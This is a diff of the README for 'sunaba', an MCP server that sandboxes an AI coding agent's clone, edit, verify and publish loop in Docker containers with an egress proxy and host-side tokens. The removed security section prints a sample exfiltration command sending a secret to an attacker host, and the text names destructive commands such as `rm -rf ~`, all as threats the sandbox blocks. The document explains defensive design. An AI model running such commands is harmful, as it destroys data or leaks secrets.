@@ -6,648 +6,139 @@
 
 An MCP server that runs an AI's test → verify → publish workflow inside disposable Docker containers. It assumes the model is already capable, so it spends its effort elsewhere: stripping away the context bloat, the broad host trust, and the raw-log noise that frontier models don't need — and shouldn't have.
 
+---
+
 ## What's different
 
 Most sandboxing tools are built around a human watching a terminal. This one is built around a model reasoning over a small, structured context window:
 
-- **The LLM is assumed competent.** No sprawling toolset to hand-hold it — a small set of first-class verbs (search, edit, verify, publish) plus an image full of CLIs it already knows.
-- **The context is never polluted.** The payload — issue bodies, source files, diffs — stays inside the container. The model carries only `run_id`s, handles, and structured summaries.
-- **Output is structured, not raw.** A green run is one line; a failure is `{test, error, file, line}`. No 5000-line logs scrolling through the context window.
-- **Trust is structural, not policy.** The host is cut off by construction, so you grant the AI *less* standing access — not more careful prompts.
+*   **The LLM is assumed competent.** No sprawling toolset to hand-hold it — a small set of first-class verbs (search, edit, verify, publish) plus an image full of CLIs it already knows.
+*   **The context is never polluted.** The payload — issue bodies, source files, diffs — stays inside the container. The model carries only `run_id`s, handles, and structured summaries.
+*   **Output is structured, not raw.** A green run is one line; a failure is `{test, error, file, line}`. No 5000-line logs scrolling through the context window.
+*   **Trust is structural, not policy.** The host is cut off by construction, so you grant the AI *less* standing access — not more careful prompts.
 
 The result is an MCP whose value is as much about **what it withholds from the model** — context, trust, noise — as what it gives it.
 
+---
+
 ## Why sandbox?
 
-AI coding agents that operate directly on the host filesystem carry maximum risk: a single `rm -rf ~` or `git push --force` can destroy your working environment, SSH keys, and git configuration. Recovery is painful and sometimes impossible.
+AI coding agents that operate directly on the host filesystem carry maximum risk: a single `rm -rf ~` or `git push --force` can destroy your working environment, SSH keys, and git configuration. 
 
 This MCP routes all AI operations through **disposable Docker containers** with structural safety guarantees:
 
 | Guarantee | Mechanism |
-|-----------|-----------|
-| AI operations never touch the host | All file ops, package installs, and test runs happen inside the container. If the AI breaks something — delete the container and move on. |
-| No network by default | `allow_network=True` must be explicitly set. AI can't accidentally call external APIs, download payloads, or push to remotes. |
-| Non-root execution | Container runs as unprivileged user `sandbox`. No `sudo`, no system package modification. |
-| VCS tokens stay host-side | The container never receives a `GITHUB_TOKEN`. Reads authenticate through the [egress proxy](#security-model)'s read-authorization grant; `publish` / `sandbox_issue_write` resolve the token host-side. Token values are masked in all output (`KEY=***`). |
-| Audit trail | Every operation is recorded in an append-only journal. You can trace exactly what the AI did, after the fact. |
-
-The value of this MCP is as much about **what the AI cannot do** as what it can.
+|---|---|
+| AI operations never touch the host | All file ops, package installs, and test runs happen inside the container. |
+| No network by default | `allow_network=True` must be explicitly set. AI can't accidentally call external APIs or push to remotes. |
+| Non-root execution | Container runs as unprivileged user `sandbox`. No `sudo`, no system package modifications. |
+| VCS tokens stay host-side | The container never receives a `GITHUB_TOKEN`. Token values are masked in all output (`KEY=***`). |
+| Audit trail | Every operation is recorded in an append-only journal (`~/.sunaba/journal.log`). |
 
 ### Reducing host permissions
+By placing a disposable container as a middle layer, you can turn off broad host execution permissions in your AI client. Host-level shell tools become unnecessary for the vast majority of tasks.
 
-A less obvious but equally important benefit: **this MCP lets you turn off broad host permissions in your AI client.**
+---
 
-Without a sandbox MCP, AI agents operate directly on the host via shell tools (`Bash`, `PowerShell`, etc.). Every file edit, git command, or config change triggers a permission prompt — and permission fatigue sets in fast. Users end up allowing everything just to keep work flowing, which means the AI effectively has unrestricted access to the host.
+## Design Philosophy
 
-With this MCP, all real work happens inside the container. Host-level shell tools become unnecessary for the vast majority of tasks, so you can keep those permissions off by default. The result: the AI is structurally constrained, not just policy-constrained.
+Four principles drive every decision in Sunaba:
 
-## Design philosophy
+1. **Security and convenience are not a tradeoff — the sandbox dissolves it**: Inside the container, the AI operates with maximum convenience (like a local shell). To the host, the AI is structurally cut off, allowing you to disable local shell permissions.
+2. **AI-first: return structure and diffs, not raw logs**: Sunaba strips logs, ANSI colors, and library stack traces, returning only structured test failures (`{test, error, file, line}`) or diffs. This keeps context windows small and reasoning accurate.
+3. **Defend the sandbox boundary — not "dangerous" commands**: We do not try to filter "dangerous" commands inside the container. Instead, we strictly isolate the boundary using a default-deny Egress Proxy and host-side token resolution.
+4. **The payload never passes through the LLM**: Issue bodies, codebases, and diffs stay inside the container. The AI only carries resource handles, run IDs, and structured summaries.
 
-This is not "an MCP that drives Docker." It is **a foundation for an AI to run test → verify → publish workflows safely, with minimal context**. Adding features is never the goal; the goal is to spend fewer tokens, preserve reasoning accuracy, and keep the human in final control. Four principles drive every decision.
+For the full detailed rationale, see [Design Decisions](docs/design.md).
 
-### 1. Security and convenience are not a tradeoff — the sandbox dissolves it
+---
 
-Normally, security and convenience pull against each other: widen permissions and you gain convenience, narrow them and you lose it. This MCP places a disposable container as a *middle layer* so you don't have to choose:
+## Typical Workflow
 
-- **To the AI**, it feels like working locally — same operations, same speed.
-- **To the host**, the AI is structurally cut off — you can turn host shell permissions off entirely.
-
-The corollary is a strict stance: **"if it can't be done inside the sandbox, that's a bug in the tooling."** Reaching for direct local work to dodge a limitation just hides a design failure. Every feature is judged against this goal.
-
-### 2. AI-first: return structure and diffs, not raw logs
-
-The most expensive thing an AI coding loop does is re-read output. So the contract is **don't show everything — return structure, not raw data, and reveal detail progressively.**
-
-- **Structured results, not 5000-line logs.** A passing test run is a one-liner: `{status: ok, passed: 120, duration: 4.2s}`. A failure is `{test, error, file, line}` — the exact assertion and location, no scrollback.
-- **State lives on the server; the LLM holds a handle.** Every result is keyed by a `run_id`. "Show me the rest of the log" or "re-run only what failed" cost a handle, not a giant re-submission. Large artifacts (coverage, generated files) come back as sized resource handles, never inlined.
-- **Diffs, not full text.** Edits return a unified diff of what changed (`transform_file`), verification returns a `git diff --stat` summary, and duplicate failures fold into `×N`.
-- **Denoise before returning.** ANSI color, timestamps, progress bars, and library/framework stack frames are stripped so only the user's code remains.
-
-> The escape hatch is always present: defaults are diffs and summaries, but the full output is *always* retrievable by handle via `offset`/`limit`.
-
-### 3. The line to defend is the sandbox boundary — not "dangerous" commands
-
-Most sandboxing tools try to classify each command as safe or dangerous. That depends on self-reporting and can't be structurally enforced. This MCP draws the line elsewhere: **the question is not "is this command dangerous?" but "does this operation leave the sandbox?"**
-
-- **Inside the container, nothing is gated.** It's disposable — whatever happens in there just gets deleted with the container.
-- **Boundary-crossing operations are gated structurally.** Network access, host mounts, persistent-volume deletion, and external VCS writes (`git push`, PR creation) go through dedicated tools; egress to GitHub is confined by an egress proxy (allowlisted repos, short-lived authorized push/read grants), so an unauthorized network write is structurally impossible — not merely discouraged. The human gate is your MCP client's own tool-approval prompt, not a bespoke in-band token.
-- **What can't be perfectly gated is caught after the fact.** An append-only journal records every operation, so the real safety net is *post-hoc auditability*, not pre-execution approval. The human's control shifts from "watch and approve everything" to "audit anything, anytime."
-
-This is the three-lock model: **network off by default · non-root enforced · VCS token opt-in.** Half the value of this MCP is the *guarantee of what the AI cannot do*.
-
-### 4. The payload never passes through the LLM
-
-In the `issue → fix → verify → publish` flow, the issue body, the source files, and the diff all stay inside the container. The LLM only ever carries `run_id`s, handles, and structured summaries — never the raw payload. This keeps context small and keeps sensitive content (tokens, large diffs) out of the model's window. Tokens injected for VCS access are opt-in per container and automatically masked (`KEY=***`) in all output.
-
-For the full rationale and the decision principles behind each tool, see [docs/design.md](docs/design.md).
-
-## Core ideas at a glance
+The core developer workflow is centered around a single 5-step loop:
 
 ```
-                 Your AI client
-                       │
-             (host shell tools OFF)
-                       │
-        ┌──────────────────────────────┐
-        │            sunaba            │
-        │   structured, minimal-context │
-        │          control plane        │
-        │  ──────────────────────────── │
-        │   • container lifecycle       │
-        │   • structured outputs        │
-        │   • egress proxy gate         │
-        │   • append-only journal       │
-        └──────────────────────────────┘
-                       │
-              Disposable container
-                       │
-            payload stays in here:
-          source · diffs · tests · git
+clone_repo            # Pull the repository into a fresh container
+    ↓
+write_file_sandbox    # Edit in place (or transform_file for bulk/computed edits)
+    ↓
+verify_in_container   # Lint + type-check, then runs tests → structured result
+    ↓
+checkpoint            # Cheap in-container Git save point (no token, no gate)
+    ↓
+publish               # Stage, squash checkpoints, push, and create PR (VCS token host-side)
 ```
 
-The model drives the control plane with small, structured messages. The heavy data — repos, diffs, logs — lives and dies inside the container. The only thing that ever crosses the boundary on purpose is a `publish`.
+The heavy data (repositories, full diffs, raw logs) lives and dies inside the container. The model only carries `run_id`s and structured summaries.
 
-## Typical workflow
+---
 
-You don't need the 30-tool reference to understand what this is for. A normal session is one pipeline:
+## Quick Start (WSL2 / Linux Daemon Setup)
 
-```
-clone_repo            # pull the repo into a fresh container
-    ↓
-write_file_sandbox    # edit in place (or transform_file for bulk/computed edits)
-    ↓
-verify_in_container   # lint + type-check gate, then tests → structured result
-    ↓
-checkpoint            # cheap in-container save point (no token, no gate)
-    ↓
-publish               # the one boundary-crossing exit: push + optional PR
-```
+Sunaba is designed to run as a resident background service (daemon) under `systemd` to avoid stdio client timeouts (60 seconds) and support persistent token rotation.
 
-The issue body, the source, and the diff never leave the container; the model only ever sees `run_id`s and structured summaries. Everything else — backgrounding, search, caching, observability — exists to make this loop cheaper to run and easier to audit. The full per-tool reference is [further down](#available-tools).
+Follow these three phases to install and start the service:
 
-## Quick start
-
+### Phase 1: Install
+Create a Python virtual environment and install the package:
 ```bash
-pip install git+https://github.com/masuda-masuo/sunaba@v0.8.0
+python -m venv ~/.local/share/sunaba-venv
+~/.local/share/sunaba-venv/bin/pip install git+https://github.com/masuda-masuo/sunaba@v0.8.0
 ```
 
-Minimal `claude_desktop_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "sunaba": {
-      "command": "python",
-      "args": [
-        "-m", "sunaba.server"
-      ]
-    }
-  }
-}
-```
-
-> Use `which python` (Linux/macOS) or `(Get-Command python).Source` (Windows) to find the Python executable path if `"python"` alone doesn't work.
-
-## Prerequisites & first-run pitfalls
-
-A few things that aren't obvious from the Quick start above and commonly trip up first-time users:
-
-- **The Docker daemon must already be running.** `docker info` should succeed before you start. On Linux, your user typically needs to be in the `docker` group; on macOS/Windows, Docker Desktop needs to be up.
-- **The first `sandbox_initialize` call can take several minutes** while it pulls the pinned image from GHCR. This collides with stdio's ~60 second client timeout (see [Transport](#transport-stdio-vs-ssehttp) below): **the most common first-run failure is the very first `sandbox_initialize` timing out**, not a bug. If you'll be using this MCP regularly, set up [SSE or HTTP transport](#transport-stdio-vs-ssehttp) before your first call; otherwise just retry once the image is cached locally.
-- **Network is off by default.** Anything that touches the network inside the container — `clone_repo`, `package_install`, `pip install`, etc. — needs an explicit:
-  ```
-  sandbox_initialize(allow_network=True)
-  ```
-  Forgetting this doesn't error immediately; the network-dependent step just fails inside the container (connection/DNS errors, or a `BLOCKED by egress proxy` message — see below).
-
-### Troubleshooting
-
-| Symptom | Likely cause | Fix |
-|---|---|---|
-| `Cannot connect to the Docker daemon` | Docker isn't running or unreachable | Start Docker Desktop / `dockerd`, confirm with `docker info` |
-| `permission denied` on `/var/run/docker.sock` | User isn't in the `docker` group (Linux) | `sudo usermod -aG docker $USER`, then log out/in |
-| Image pull fails or hangs | Registry unreachable, or disk space exhausted | Check network access to GHCR; `docker system df` / `docker system prune` |
-| `sandbox_initialize` times out on first use | Initial GHCR image pull exceeds stdio's ~60s client timeout | Retry once cached, or switch to [SSE/HTTP](#transport-stdio-vs-ssehttp) |
-| `BLOCKED by egress proxy: ...` | Destination host not allowlisted, or `allow_network=True` was omitted | Re-check `sandbox_initialize(allow_network=True)`; for pushes, confirm the target repo is listed in `SUNABA_ALLOWED_REPOS` (see [Security model](#security-model)) |
-
-## Installation
-
-```bash
-# Install (pinned to a released version, recommended)
-pip install git+https://github.com/masuda-masuo/sunaba@v0.8.0
-
-# Update to the latest commit on the default branch
-pip install --force-reinstall git+https://github.com/masuda-masuo/sunaba
-
-# Pin to a specific commit
-pip install git+https://github.com/masuda-masuo/sunaba@<commit-hash>
-
-# Uninstall
-pip uninstall sunaba
-```
-
-Requirements: Python 3.10+, Docker.
-
-## Configuration
-
-### Transport: stdio vs SSE/HTTP
-
-stdio has a ~60 second client timeout. Long operations (`docker pull`, `pip install`, large `copy_project`) should use SSE or HTTP transport:
-
-```json
-"args": [
-  "-m", "sunaba.server",
-  "--transport", "sse",
-  "--host", "127.0.0.1",
-  "--port", "8750"
-]
-```
-
-| Transport | Timeout | Notes |
-|-----------|---------|-------|
-| `stdio` (default) | ~60s | Works with all clients |
-| `sse` | None | Recommended for long operations |
-| `http` | None | Standard HTTP |
-| `streamable-http` | None | MCP spec Streamable HTTP |
-
-For SSE/HTTP transports, the server binds to `127.0.0.1:8750` by default.
-
-### Observability dashboard
-
-Starts a local read-only web dashboard showing active containers, run history, and pass/fail stats on port **8751** by default.
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--dashboard-port` | `8751` | Dashboard port. Set to `0` to disable. |
-| `--dashboard-host` | `127.0.0.1` | Bind address. |
-
-> **WSL tip**: If your MCP server binds to `--port 8750`, use `--dashboard-port 8751` to avoid conflict. The dashboard is reachable from Windows at `http://localhost:8751` via WSL's localhost forwarding.
-
-### Optional: push notifications
-
-```json
-"--webhook-url", "https://hooks.example.com/notify",
-"--failure-threshold", "5",
-"--long-run-seconds", "300"
-```
-
-Sends OS desktop notifications (Linux) or webhook notifications on boundary-crossing operations, failure threshold exceeded, or long-running executions.
-
-## Available tools
-
-This is the full reference. You almost never touch most of it directly — the common path is the five-step [Typical workflow](#typical-workflow) above. The rest exists to make that loop cheaper (caching, diffs, backgrounding) and auditable (journal, trace, dashboard).
-
-### Lifecycle
-
-| Tool | Description |
-|------|-------------|
-| `sandbox_initialize` | Start a container. Returns 12-char `container_id`. Supports `image`, `allow_network`. |
-| `sandbox_stop` | Stop and remove a container. |
-| `run_container_and_exec` | One-shot: `initialize` → `exec` → `stop`. |
-| `sandbox_list_containers` | List all managed containers with metadata (name, image, status, age, idle time). |
-| `sandbox_attach` | Connect to an existing container by name or ID prefix. |
-
-### Execution
-
-| Tool | Description |
-|------|-------------|
-| `sandbox_exec` | Run commands synchronously. Supports `verbose` (`error_only`/`summary`/`full`), truncation, pagination (`offset`/`limit`). |
-| `sandbox_exec_background` | Run commands with `nohup` in background. Returns `job_id`. |
-| `sandbox_exec_check` | Poll background job status. Returns `"running"`, stdout on success, or error on failure. |
-| `package_install` | Structured `pip install` wrapper (packages/editable/constraints/requirements/upgrade/extras). Returns installed packages and error details instead of raw pip logs. |
-
-### File operations
-
-| Tool | Description |
-|------|-------------|
-| `write_file_sandbox` | **Primary edit path for AI.** Write/update files. Supports full overwrite, line-range replacement, append, and `old_str` replacement (uniqueness check + whitespace-flexible fallback). |
-| `transform_file` | **Imperative edit path.** Edit a file by supplying Python `transform(text) -> str` that computes the new content (runs inside the container; returns a unified diff). Best for bulk / repetitive / structural / computed edits. |
-| `read_file_range` | Read `limit` lines starting at `offset`. Returns JSON with pagination metadata. |
-| `list_files` | List files inside the container using `find`. Returns JSON array of file paths. |
-| `copy_project` | Copy a local directory into the container (tar archive streaming). |
-| `copy_file` | Copy a single local file into the container. |
-
-### Edit/Verify subsystem
-
-| Tool | Description |
-|------|-------------|
-| `search_in_container` | Search for text patterns across files. Lexical (ripgrep) or structural (ast-grep) mode. Supports glob/ignore_case/context/output_mode/offset params. Returns metadata (`shown`, `total`, `truncated`, `next_offset`). |
-| `lint_in_container` | Run linter on a file (`.py` → ruff/pylint, `.js/.ts/.jsx/.tsx` → eslint). Pass `fix=True` to apply `ruff check --fix` / `eslint --fix` autofixes and return the remaining findings. |
-| `type_check_in_container` | Run type checker on a file (`.py` → pyright, `.ts/.tsx` → tsc). |
-| `verify_in_container` | **Pre-publish test gate.** Run tests (pytest/jest/go test via language-aware dispatch), then auto-full-suite. Returns diff summary. |
-| `diff_in_container` | Structured `git diff` between *base* and HEAD. File-by-file summary (`path`/`status`/`additions`/`deletions`) or per-file hunks when a `path` is given. |
-
-### Observability
-
-These journal/trace **read** tools are opt-in: set `SUNABA_OBSERVABILITY_TOOLS=1` in the server environment to register them. Telemetry recording itself is always on; for aggregation, reading `~/.sunaba/journal.log` directly on the host works without any of these tools.
-
-| Tool | Description |
-|------|-------------|
-| `sandbox_read_journal` | Read the append-only execution journal. Filter by `run_id`, limit by `max_entries`. |
-| `sandbox_trace` | Generate HTML or JSON replay trace for a specific `run_id`. |
-| `sandbox_list_runs` | List all runs recorded in the journal. |
-| `sandbox_journal_path` | Return path to `~/.sunaba/journal.log`. |
-| `sandbox_trace_dir` | Return path to `~/.sunaba/traces/`. |
-
-### VCS / Versioning
-
-| Tool | Description |
-|------|-------------|
-| `clone_repo` | Clone a Git repository inside the container using `gh repo clone`. |
-| `issue_view` | Read a GitHub issue and save its body to a file inside the container. |
-| `checkpoint` | Local Git checkpoint (commit only, no push). Use frequently during edit loops. |
-| `checkpoint_list` | List unpushed local checkpoints. |
-| `checkpoint_restore` | Restore working tree to a previous checkpoint (`git reset --hard`). |
-| `publish` | Stage, commit, push, and optionally create a PR (one-shot). |
-| `sandbox_issue_write` | Create a GitHub issue or comment on one, host-side (one-shot, #414). |
-| `sandbox_pr_review_write` | Create and submit a PR review (with optional inline comments) in one shot, host-side (#477). |
-
-## Compatibility policy
-
-The external contract is versioned with [Semantic Versioning](https://semver.org/). The project is currently in `0.x`, which under semver means **the contract is not yet frozen**: a breaking change is a minor bump, not a major one.
-
-- **Covered by semver**: MCP tool names, tool argument names/types, return-value shapes, and environment variable names.
-- **Breaking changes** (renaming/removing a tool or argument, changing a return shape, renaming an environment variable, reversing a default) land only in a **minor** bump while in `0.x` — never a patch — and are recorded in [CHANGELOG.md](CHANGELOG.md).
-- **Additive changes** (new tools, new optional arguments, new fields appended to a return object) are **patch** bumps while in `0.x`.
-- **Not covered**: the sandbox image contents (see below), internal module layout, and anything not exposed as an MCP tool surface.
-
-`1.0.0` will freeze the contract so that breaking changes require a major bump. It is promoted only once the operational side is stable enough to hold that promise — the criteria are recorded in [docs/design.md](docs/design.md) §15.
-
-Pin to a released tag for stability (see [Installation](#installation)); track `main` only if you want unreleased changes and accept that the contract above does not apply until the next tag.
-
-## Sandbox image
-
-The default image is a purpose-built sandbox image pushed to GHCR. It bundles all tools needed for AI-driven workflows:
-
-| Category | Tool | Purpose |
-|----------|------|---------|
-| Text search | `ripgrep` (`rg`) | Fast regex search |
-| Structural search | `ast-grep` (`sg`) | AST-based code search |
-| Text replace | `sd` | Find-and-replace |
-| File search | `fd` | Fast `find` alternative |
-| Symbols | `universal-ctags` | Code indexing |
-| Lint | `ruff` | Python linting |
-| Type check | `pyright` | Python type checking |
-| VCS | `git`, `gh` | Version control, GitHub CLI |
-| Package install | `uv` | Fast pip alternative |
-| JSON | `jq` | JSON processing |
-
-The images are built from the split `docker/Dockerfile.{base,python,go}` and automatically published to GHCR via CI. When `sandbox_initialize` is called without an explicit `image`, the project's language is detected (from a Shiori pre-clone or the GitHub repo root) and the matching variant is chosen:
-
-| Detected | Image |
-|----------|-------|
-| Python (`pyproject.toml`, `setup.py`, `requirements*.txt`, ...) | `sandbox:python` (base + python + js) |
-| Go (`go.mod`) | `sandbox:go` (base + go + js) |
-| JS only / unknown / unsupported / py+go polyglot | `sandbox:base` (neutral: node + VCS + search, no language toolchain) |
-
-No language is hardcoded as the default. Unknown or unsupported projects fall back to the neutral `sandbox:base` (init never blocks); a notice in the result explains the fallback. To override detection, pass an image explicitly:
-
-```
-sandbox_initialize(image="my-image@sha256:...")
-```
-
-A minimal variant (`docker/Dockerfile.sandbox.minimal`) with git + python + pytest only is also available for lightweight use.
-
-**Image/server compatibility**: sandbox images are versioned independently of the `sunaba` package — `image_pins.json` pins each variant to a GHCR digest (updated via `scripts/update_image_pins.py`) and is not part of the [compatibility policy](#compatibility-policy) above. Any server release is expected to work with its bundled `image_pins.json`; if you override `image` explicitly, keep the in-container toolset (§ table above) compatible with what the server's edit/verify tools expect (e.g. `ruff`/`pyright` for lint/type gates).
-
-## Deployment & credential management
-
-For production use, keep GitHub credentials in the **OS keystore** instead of plaintext config files and let the server mint short-lived tokens on demand. The security model below is the same on every platform — only the keystore backend, the unlock UX, and how the server process is launched differ.
-
-> This section covers **host-side** credential resolution (how the server authenticates to GitHub). It is complementary to the [security model](#security-model) below, which covers why the *container* never receives a token, regardless of platform.
-
-### The shared security model: short-lived GitHub App tokens
-
-The recommended model uses [mcp-launcher](https://github.com/masuda-masuo/mcp-launcher)'s `mcp-token` broker:
-
-- **Secrets live in the OS keystore, never in config files.** The GitHub App's `APP_ID`, `PRIVATE_KEY`, and `INSTALLATION_ID` are registered once with `mcp-token register github <KEY> <value>`.
-- **Tokens are minted on demand and short-lived.** `mcp-token github` mints a fresh installation token (cached ~55 min; GitHub expiry 1 h). No long-lived token sits in a config file or environment.
-- **The private key is out of reach.** A prompt-injection attack can only touch what the model sees — MCP tool responses — never the keystore. Worst case, a leaked token expires within an hour; the key that mints tokens is never exposed.
-- **The host resolves the token; the container never holds it.** The resolved token is used host-side by the egress proxy's read/push grants and by `publish` / `sandbox_issue_write` (see [security model](#security-model)).
-
-The host resolves the token from one of three orthogonal sources (`token_broker.py`, design.md §11.2):
-
-| Source | Host env var | How it works | Role |
-|--------|-------------|--------------|------|
-| Static token | `GITHUB_TOKEN` | Used verbatim | Minimal setup |
-| Explicit command | `GITHUB_TOKEN_COMMAND` | Runs the command (e.g. an `mcp-token` binary path); stdout becomes the token. Takes priority. | Manual management |
-| Vendored broker | `GITHUB_TOKEN_BROKER_SERVICE` | Resolves/downloads the pinned `mcp-token` binary (SHA-256 verified, cached) and runs `mcp-token <service>` | Auto-managed (recommended) |
-
-> **Bootstrap note:** the broker binary lives in a private repo, so the very first download needs a token available (e.g. during setup, or a session still launched via mcp-launcher). After that the checksum-verified binary is cached and every later run reuses it. For a fully tokenless daemon, pre-provision the binary and point `GITHUB_TOKEN_BROKER_BIN` at it.
-
-### Per-platform deployment
-
-**Windows — mcp-launcher (stdio)**
-
-Run `sunaba` behind mcp-launcher as a child process; the launcher proxies stdio and resolves the token internally, so no `GITHUB_TOKEN_*` env var is needed.
-
-```
-AI Tool (Claude Desktop / etc.)
-    └─ mcp-launcher  ← Windows Credential Manager, transparent MCP session restart
-           └─ sunaba  ← actual MCP server (child process)
-```
-
-- **Keystore:** Windows Credential Manager (DPAPI).
-- **Unlock:** automatic at Windows login — no extra step.
-- mcp-launcher eliminates PATs from `claude_desktop_config.json`, rotates the GitHub App installation token, and restarts the MCP session without losing state.
-
-**WSL2 — systemd + streamable-HTTP**
-
-Useful for sharing one server across clients (e.g. opencode + Claude Desktop), dropping the Windows-only mcp-launcher dependency, and avoiding stdio's ~60 s timeout.
-
-```
-Claude Desktop ─ mcp-remote ┐
-                            ├─ sunaba (WSL2, streamable-http @ 127.0.0.1:8750/mcp)
-opencode ───────────────────┘
-```
-
-Run the server as a systemd **user** service.  The setup is split into three phases, each
-with a dedicated script in `scripts/`:
-
-**Phase 1 — Install** (one-time, no auth needed)
-
-The package is public on GitHub, so a plain HTTPS clone works without credentials:
-
-```bash
-python -m venv /path/to/venv/sunaba
-/path/to/venv/sunaba/bin/pip install \
-    git+https://github.com/masuda-masuo/sunaba@v0.8.0
-```
-
-**Phase 2 — Setup** (one-time, interactive)
-
-Register your GitHub App credentials in the OS keystore.  The `mcp-token` binary
-(masuda-masuo/mcp-launcher, public repo) is downloaded automatically from the
-pinned release — no token bootstrap cycle:
-
+### Phase 2: Setup (Keystore Setup)
+Register your GitHub App credentials into the OS keystore:
 ```bash
 ./scripts/setup.sh
 ```
 
-The script resolves `mcp-token` (PATH → local cache → anonymous download),
-prompts for the three GitHub App values (App ID, Installation ID, Private Key
-file path), and stores them in the OS keystore via `mcp-token register`.
-Secrets live in the keystore, never in config files or env vars.
-
-**Phase 3 — Enable** (one-time)
-
-Place the systemd user unit and start the service:
-
+### Phase 3: Enable the systemd Service
 ```bash
-./scripts/install-systemd.sh /path/to/venv/sunaba
+./scripts/install-systemd.sh ~/.local/share/sunaba-venv
 ```
 
-The script substitutes `@VENV_DIR@` and `@PROJECT_DIR@` template variables,
-places `sunaba.service` in `~/.config/systemd/user/`, runs
-`systemctl --user daemon-reload`, and `systemctl --user enable --now`.
+For client configurations (such as connecting Claude Desktop via `mcp-remote`) and advanced configurations, see the [Daemon Setup Guide](docs/daemon_setup.md).
 
-The unit file uses `GITHUB_TOKEN_BROKER_SERVICE=sunaba` so the
-server calls `mcp-token sunaba` at runtime, which reads the
-keystore-registered credentials and mints a short-lived token — no human
-intervention needed after boot or restart.
+---
 
-```ini
-# scripts/sunaba.service (template excerpt)
-[Service]
-ExecStart=@VENV_DIR@/bin/python -m sunaba.server \
-    --transport streamable-http --host 127.0.0.1 --port 8750
-Environment=GITHUB_TOKEN_BROKER_SERVICE=sunaba
-Environment=DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/%U/bus
-```
+## Prerequisites & First-Run Pitfalls
 
-Clients connect via `mcp-remote`:
+*   **Docker daemon must be running**: `docker info` should succeed before you start.
+*   **The first initialization can take several minutes**: The first call to `sandbox_initialize` pulls the base sandbox images from GHCR. If using stdio, this can trigger client timeouts. We recommend using the [systemd Daemon Setup](docs/daemon_setup.md) to handle this.
+*   **Network is off by default**: Anything that touches the network inside the container (e.g. `clone_repo`, `package_install`) requires setting `allow_network=True` during initialization.
 
-```json
-{ "mcpServers": { "sunaba": {
-  "command": "npx",
-  "args": ["-y", "mcp-remote", "http://127.0.0.1:8750/mcp"]
-}}}
-```
+### Troubleshooting
 
-- **Keystore:** GNOME Keyring (libsecret).
-- **Unlock:** one password prompt on first access after WSL boots; stays unlocked for the session. (An empty-password keyring auto-unlocks but is then readable by any host process — a security trade-off.)
-- **Gotchas:**
-  - `Environment=` values containing spaces (e.g. a `GITHUB_TOKEN_COMMAND` with a service argument) **must be quoted**, or the argument is truncated.
-  - Without `DBUS_SESSION_BUS_ADDRESS`, the service can't reach the keyring.
-  - `mcp-token list` may fail under WSL (Go's godbus can't reach the D-Bus secret service); use `secret-tool search --all service mcp-launcher` instead.
-
-**Linux (native) — systemd + HTTP**
-
-Same as WSL2, but on a desktop-session Linux the keyring unlocks automatically with the session — no first-access password prompt.
-
-- **Keystore:** libsecret / gnome-keyring / kwallet (needs `libsecret-1-0` + `gnome-keyring`).
-- **Token resolution:** same broker as WSL2 (`GITHUB_TOKEN_BROKER_SERVICE` → `mcp-token`).
-- **Transport:** `http` or `sse`; connect directly or via `mcp-remote`.
-
-### Platform differences at a glance
-
-| | Windows | WSL2 | Linux (native) |
-|---|---|---|---|
-| Server launch | mcp-launcher (stdio proxy, child process) | systemd user service | systemd user service |
-| Transport | stdio / SSE / HTTP | streamable-HTTP (Claude Desktop via mcp-remote) | HTTP / SSE |
-| Keystore | Windows Credential Manager (DPAPI) | GNOME Keyring (libsecret) | libsecret / gnome-keyring / kwallet |
-| Token resolution | managed by launcher | `GITHUB_TOKEN_BROKER_SERVICE` → mcp-token | `GITHUB_TOKEN_BROKER_SERVICE` → mcp-token |
-| Keyring unlock | automatic at Windows login | one prompt per WSL boot | automatic with desktop session |
-| Main gotcha | Smart App Control may block the binary | quoting · `DBUS_SESSION_BUS_ADDRESS` · `secret-tool` fallback | keyring daemon must be running |
-
-## Security model
-
-The sandbox offers two **independent** guarantees. They are easy to conflate, so keep them distinct: one is always on and does not involve the egress proxy at all; the other is what the (opt-in) egress proxy adds.
-
-### 1. Token containment — always on, proxy-independent
-
-The sandbox container **never receives a VCS token.** There is no opt-in flag: credentials stay host-side. This is enforced by *how the write tools work*, not by the network layer — so it holds whether or not the egress proxy is enabled.
-
-- **Reads** (`clone_repo`, `sandbox_initialize(clone_repo=...)`, `pr=N`): a public clone needs no credential; a private one has a host-resolved token handed to the proxy for a short read-authorization grant (this path does require the proxy). Either way no token enters the container.
-- **Pushes / PRs** go through `publish`: it resolves a token host-side and hands it to the proxy for a short authorized push grant (push), or calls the GitHub API directly from the host (PR creation).
-- **Issue / comment writes** go through `sandbox_issue_write`, which calls the GitHub REST API host-side.
-- All output is automatically sanitized: any token value is masked as `KEY=***` in stdout/stderr.
-
-This follows the principle of least privilege — the container's own `git`/`gh` stay unauthenticated, so a stray in-container `git push` has no credential to leak.
-
-### 2. Egress containment — the egress proxy (default-on)
-
-The egress proxy is **enabled by default**. Set `SUNABA_ENABLE_EGRESS_PROXY=false` to opt out. When enabled, the container's only route to the outside is the HTTP(S) proxy on an internal Docker network — SSH, arbitrary TCP, and direct-to-IP egress are cut off by that topology alone. On top of that the proxy is a **default-deny egress gate**: a request to a host outside the allowlist is refused with a `403`, so arbitrary exfil (e.g. `curl https://attacker.com/?d=secret`) is blocked, not just git pushes. Two allowlists, deliberately separate, govern the two different questions:
-
-- **Where the sandbox may connect** — `SUNABA_ALLOWED_EGRESS_HOSTS` (destination hosts). Defaults to GitHub and the package registries (see below); everything else is denied.
-- **Where the sandbox may write** — `SUNABA_ALLOWED_REPOS` (push / GitHub-API-write targets). Reachability says nothing about write authorization; a repo can be cloneable but not pushable.
-
-Use `allow_network=True` only when containers actually need network access. For the read/push grants to authenticate, the proxy must be configured with a host-resolvable token (broker / `GITHUB_TOKEN`).
-
-### What each configuration guarantees
-
-| Guarantee | proxy **off** (default) | proxy **on** |
+| Symptom | Likely Cause | Fix |
 |---|---|---|
-| No token ever enters the container | ✅ (proxy-independent) | ✅ |
-| Push restricted to an allowlist (network layer) | ❌ | ✅ (`SUNABA_ALLOWED_REPOS`) |
-| Non-HTTP egress cut off (SSH / raw TCP / direct IP) | ❌ (`allow_network=True` is unrestricted) | ✅ (internal network, proxy is the only exit) |
-| Arbitrary-host egress denied (exfil containment) | ❌ | ✅ (`SUNABA_ALLOWED_EGRESS_HOSTS`, default-deny) |
